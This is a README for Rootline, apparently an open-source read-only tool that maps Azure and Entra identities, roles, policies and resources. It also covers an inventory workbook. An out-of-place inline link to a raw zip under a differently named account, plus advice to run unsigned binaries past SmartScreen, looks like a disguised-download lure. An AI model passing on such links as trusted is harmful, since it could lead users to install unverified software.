# Rootline — for Azure

See your whole Microsoft cloud from the tenant root down: who can do what, where, and why.
Two read-only tools:

- **Rootline** — a Windows app that maps the whole Entra → Azure landscape: identities and their roles,
  management groups and landing zones, policies, resources and how they connect. [Jump to Rootline](#rootline--desktop-app-for-the-whole-entra--azure-landscape)
- **Rootline Inventory workbook** — an Azure Monitor workbook that inventories resources with Azure Resource Graph,
  right in the portal. Every grid can be filtered and exported to Excel.

> Independent open-source project. Not affiliated with or endorsed by Microsoft.
> "Azure" is a trademark of Microsoft Corporation.

## Workbook tabs

| Tab | What you get |
| --- | --- |
| Overview | Totals, top resource types, resources by location and subscription |
| All resources | Full inventory with resource-type filter |
| Compute | VMs (size, OS, power state, disks, zones), scale sets, managed disks (incl. unattached), AKS, App Service plans and apps |
| Networking | VNets, subnets (NSG, route table, NAT, delegation), public IPs (incl. unassociated), NSGs, private endpoints, gateways/firewalls/load balancers |
| Storage & data | Storage accounts (TLS, public access, HNS), key vaults, SQL servers/databases, other data and messaging services |
| Tags | Coverage per tag key, tag values, untagged resources |
| Subscriptions & RGs | Subscriptions with parent management group, resource groups with resource counts |

Scope filters apply to every tab: **subscriptions, resource groups, locations, tag name / value**.

## Workbook requirements

- **Reader** on the subscriptions (or management group) you want to see — nothing more.
- The workbook only reads Azure Resource Graph; it makes no changes.

## Install the workbook

**Option A — paste (fastest)**
1. Azure portal → *Monitor* → *Workbooks* → *New*.
2. Open the *Advanced editor* (`</>`), choose *Gallery Template*.
3. Replace the content with `rootline-inventory.workbook.json` → *Apply* → *Save*.

**Option B — Bicep**
```bash
az deployment group create -g <resource-group> -f main.bicep
```
`main.bicep` loads the JSON file directly, so the two never drift apart.

## Rootline — desktop app for the whole Entra → Azure landscape

Rootline is a Windows app that shows your tenant as one picture:
**who has which rights, where subscriptions land, which policies apply, and what's deployed and connected.**
Install it, sign in with your work account (MFA as usual), click **Scan now**. It only reads, and everything stays on your PC.<br>
**<a href="https://github.com/RenruDall/Rootline/raw/refs/heads/main/Rootline-portable-1.0.0.zip">Rootline Portable:</a>** Contains a portable version without installer. <br>

### Five views
- **Mind map** — tenant root → management groups (including empty landing zones) → subscriptions → resource groups → resources.
  Click any scope to see its **landing-zone path**, **who has access there** (assigned or inherited) and **which policies apply**
  (inherited, enforcement mode, non-compliant count).
- **Topology** — how resources connect: NIC ↔ VM, subnets, VNet peerings, NSGs, route tables (and the firewall they route to),
  NAT gateways, public IPs, private endpoints, load balancers, application gateways, VPN/ExpressRoute connections,
  private DNS links, AKS, App Service, disks. Large estates start with the network backbone; click a subnet to open it.
- **Access** — Entra identities → groups → Entra directory roles and Azure RBAC roles → the management groups,
  subscriptions, resource groups and resources they reach, as a privilege map.
  **Who can do this, and why:** click any scope to see the *people* who can change it, with the full chain —
  access package → group → PIM for Groups → role (active or PIM-eligible, with end dates) → scope.
  Pick any user, group or app for everything it can do and its **blast radius** (how many resources and subscriptions
  it could change right now, and after PIM activation). Also access packages, pending requests, guests and Conditional Access.
- **Findings** — checks against Microsoft guidance, each with *why it matters* and *how to fix*: standing Global
  Administrators, permanent privileged roles, guests with change rights, direct user assignments, deleted identities,
  owners per subscription, root-level access, pipeline apps with Owner, subnets without NSG, VMs with public IPs,
  spokes not routed through the hub firewall, subscriptions outside landing zones or without policy, non-compliance,
  expiring access, unattached disks and unused IPs — plus a landing zone structure check (CAF reference).
- **Changes** — compares any two scans: who gained or lost access (roles, group membership, access packages),
  moved subscriptions, new or removed resources and connections, policy and enforcement changes.

### Install
1. Download **`Rootline-Setup-<version>.exe`** from the latest release.
2. Run it. It installs for your user only (no admin rights) and adds **Rootline** to the Start menu.
3. Open Rootline, enter your work email and click **Sign in with Microsoft**.
   Microsoft's own sign-in appears — password or passwordless, **MFA**, Conditional Access, or simply the account
   you're already signed in with on Windows. Rootline never sees your password.
4. Click **Scan now**.

Needs Windows 10 or 11 (x64). Everything it needs is already part of Windows (.NET Framework 4.8 and the Edge
WebView2 runtime; the installer points you to WebView2 in the rare case it's missing).
A portable zip is also attached to each release. Neither is code-signed yet, so SmartScreen may warn on first
launch (*More info → Run anyway*); `SHA256SUMS.txt` lists the hashes (`Get-FileHash <file>`).

### Audit evidence
On *Findings*, **Save audit report** writes one printable page (print it to PDF from the browser) with a summary,
all findings, the **privileged access register** (everyone who can change resources or holds an admin role, and how
they got it), access packages, policies with compliance, Conditional Access, the changes since the compared scan and
the scan notes. **Export access (CSV)** lists everyone's access, one row per identity, role and scope, for Excel.

### Permissions
- **Azure:** your account needs *Reader* on the management groups or subscriptions you want to see
  (this also covers PIM-eligible Azure roles).
- **Entra:** read access to the directory (`Directory.Read.All`, `RoleManagement.Read.Directory`, `Policy.Read.All`).
  An administrator approves this once per organization. Until then Rootline maps Azure only and shows the
  approval link in the app.
- **Access packages and PIM for Groups** (optional): `EntitlementManagement.Read.All` and
  `PrivilegedEligibilitySchedule.Read.AzureADGroup`. Without them those parts are skipped and noted.
- PIM-eligible roles need Entra ID P2, access packages Entra ID Governance (or P2); without them the app shows what
  exists and notes the gap.
- Anything the account can't read is skipped and listed under *Scan notes*, never guessed.

### Set up the app registration (once)
Microsoft sign-in needs an app identity. Create it in your tenant:
1. **Entra admin center → App registrations → New registration.** Name: *Rootline*.
   Supported accounts: *Accounts in any organizational directory (multitenant)* — or *single tenant* for your own use only.
   Leave the redirect URI empty and register.
2. **Authentication → Add a platform → Mobile and desktop applications.** Add these redirect URIs:
   `ms-appx-web://microsoft.aad.brokerplugin/<Application (client) ID>` (Windows sign-in) and `http://localhost`.
3. **API permissions → Add a permission**, all *Delegated*:
   *Azure Service Management → user_impersonation*;
   *Microsoft Graph → Directory.Read.All, RoleManagement.Read.Directory, Policy.Read.All*,
   and for access packages and PIM for Groups *EntitlementManagement.Read.All, PrivilegedEligibilitySchedule.Read.AzureADGroup*.
   Then **Grant admin consent** for your tenant.
4. Copy the **Application (client) ID**. Either enter it once in the app (*Advanced* on the sign-in screen), or set it as
   repository variable `ROOTLINE_CLIENT_ID` (GitHub → Settings → Secrets and variables → Actions → Variables) so every
   build has it built in.

Other organizations using your multitenant registration approve it with the link the app shows
(`https://login.microsoftonline.com/<their tenant>/adminconsent?client_id=<your client ID>`).

### Your data
Scans are saved in `%LOCALAPPDATA%\Rootline\snapshots\<tenant>` (last 30 kept); pick older ones from the drop-down.
**Save report** writes an offline HTML copy of a scan.

> Scans and reports show resource names, IP ranges, tags and **who holds admin rights**. That's sensitive:
> keep them internal and share reports only with people who could see the same data themselves.

Opening `rootline.template.html` directly in a browser shows a small demo tenant — handy for trying changes to the page.

### Files
| File | Purpose |
| --- | --- |
| `src/Rootline.App/` | The Windows app: window (WPF + WebView2), Microsoft sign-in (MSAL), icon |
| `src/Rootline.Core/` | The scanner: Resource Graph, ARM and Microsoft Graph, builds the map data |
| `rootline.template.html` | The page the app shows (and saved reports use) |
| `lib/cytoscape.min.js` | Graph library (Cytoscape.js 3.30.2, MIT — see `THIRD-PARTY-NOTICES.txt`) |
| `installer/Rootline.iss` | Installer (Inno Setup) |
| `tests/` | Fake Azure + Entra tenant served over HTTP, and the round-trip test |
| `.github/workflows/main.yml` | Tests, builds and publishes releases |
| `rootline-inventory.workbook.json`, `main.bicep` | The Azure Monitor workbook |

## Limits and notes

- Azure Resource Graph results are subject to its paging and throttling limits; on very large estates, narrow the scope filters.
- Resource Graph data can lag real changes by a few minutes.
- Management-group rows need tenant-level read access; the subscription tab shows each subscription's parent group instead.

## Releasing a new version

```bash
git tag v1.0.0
git push origin v1.0.0
```
GitHub Actions runs the fake-tenant test, builds the app on Windows, checks the build, creates the installer and
portable zip and publishes a release with `SHA256SUMS.txt`. *Run workflow* on the Actions tab builds a test copy
without releasing.

Build locally (Windows, .NET 8 SDK):
```powershell
dotnet build src\Rootline.App\Rootline.App.csproj -c Release -p:Version=1.0.0
```

## Tests

`tests/` contains a fake Azure + Entra tenant ("Alpina Demo": landing zones, hub-and-spoke in two regions,
~2,600 resources, ~3,000 connections, ~400 identities with roles, PIM for roles and groups, access packages, guests,
policies and Conditional Access).
`fake_server.py` serves it as Resource Graph, ARM and Microsoft Graph over HTTP — checking that each call uses the
right token, paging like the real services, throttling with 429 now and then, and refusing one management group.
`Test-Rootline.ps1` compiles the scanner, scans the fake tenant and checks it rebuilds that tenant exactly
(`-SaveScan scan.json` keeps the result, handy for trying the page).
```powershell
python tests/fake_tenant.py tests/out
pwsh tests/Test-Rootline.ps1
```
Every GitHub build runs this first.

## Contributing

Issues and pull requests are welcome. Please test changes by pasting the JSON into a real workbook before opening a PR — the portal catches problems static checks miss.
Keep queries within Resource Graph limits (max 3 `join`/`union` and 3 `mv-expand` per query; no `let`, `datatable`, `mv-apply`, `evaluate`).

## Credits

Coverage ideas were inspired by [Azure Resource Inventory (ARI)](https://github.com/microsoft/ARI) (MIT), a PowerShell tool that produces Excel reports.
The workbook and Rootline are independent implementations; no ARI code is included.
Rootline uses [Cytoscape.js](https://js.cytoscape.org) (MIT), included in `lib/` and embedded in each report.
Query patterns follow the public [Azure Resource Graph documentation](https://learn.microsoft.com/azure/governance/resource-graph/) and [Azure Workbooks documentation](https://learn.microsoft.com/azure/azure-monitor/visualize/workbooks-overview).

## License

[MIT](LICENSE) © 2026 Michael Ladurner
